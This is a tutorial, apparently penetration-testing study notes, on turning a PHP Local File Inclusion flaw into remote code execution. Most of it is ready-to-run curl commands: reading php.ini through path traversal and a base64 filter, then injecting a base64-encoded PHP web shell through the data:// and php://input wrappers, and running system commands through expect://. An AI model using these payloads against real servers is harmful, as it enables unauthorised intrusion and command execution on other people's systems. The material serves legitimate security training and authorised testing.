Under certain conditions, LFI can be leveraged to achieve **Remote Code Execution (RCE)**.

This depends on:

- PHP configuration
    
- Enabled wrappers
    
- How the vulnerable function handles input
    

**PHP wrappers** are special stream handlers that allow developers to interact with data sources (e.g., files, input streams, encoded data) in different ways during file inclusion.

In some cases, instead of just reading files, we can abuse these wrappers to **inject and execute PHP code directly** through the inclusion function.

---

## Data Wrapper

The `data://` wrapper allows including inline data as if it were a file. This means we can directly inject PHP code into the request.

This functionality depends on the `allow_url_include` setting being enabled.

### Checking PHP Configuration

Before using this wrapper, we need to confirm if the required option is enabled.

We use LFI with the Base64 filter to safely read the PHP configuration file:

```bash
curl "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

We then decode the output and search for the relevant setting:

```bash
echo "<base64>" | base64 -d | grep allow_url_include
```

### Exploiting Data Wrapper

Once confirmed, we can inject a PHP payload. Since some characters may break the request, we encode the payload in Base64.

First, generate a simple web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Then include it through the `data://` wrapper and pass a command:

```bash
http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Alternatively, using curl:

```bash
curl -s 'http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

---

## Input Wrapper

The `php://input` wrapper allows us to send PHP code in the body of a POST request instead of the URL.

This is useful when:

- The application accepts POST requests
    
- Input is included directly
    

We send the PHP payload in the request body and trigger execution via a parameter:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?language=php://input&cmd=id"
```

---

## Expect Wrapper

The `expect://` wrapper is designed to execute system commands directly.

It is not enabled by default and must be installed as a PHP extension.

### Checking Availability

We can check if the expect module is referenced in the PHP configuration:

```bash
curl -s "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
| grep -oP '(?<=<h2>Containers</h2>).*' \
| base64 -d | grep expect
```


### Exploiting Expect Wrapper

If available, we can execute commands directly without injecting PHP code:

```bash
curl -s "http://target/index.php?language=expect://id" | grep uid
```
